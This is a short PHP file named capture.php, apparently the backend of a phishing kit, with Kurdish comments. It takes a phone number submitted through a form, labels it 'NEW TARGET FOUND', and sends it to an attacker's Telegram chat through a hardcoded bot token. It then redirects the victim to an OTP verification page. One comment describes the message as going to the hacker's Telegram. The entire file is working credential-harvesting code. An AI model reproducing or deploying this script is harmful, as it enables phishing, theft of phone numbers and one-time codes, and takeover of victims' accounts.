<?php
// capture.php
$apiToken = 8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc; // تۆکنی پۆتەکەت لێرە دابنێ
$chat_id = 6679834643;    // ئایپی تێلگرامی خۆت لێرە دابنێ

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = $_POST['phone'];
    $message = "🚨 NEW TARGET FOUND!\n\n📱 Phone: " . $phone;

    // ناردنی زانیاری بۆ تێلگرامی هاککەرەکە
    file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=" . urlencode($message));

    header("Location: otp_verify.html");
    exit();
}
?>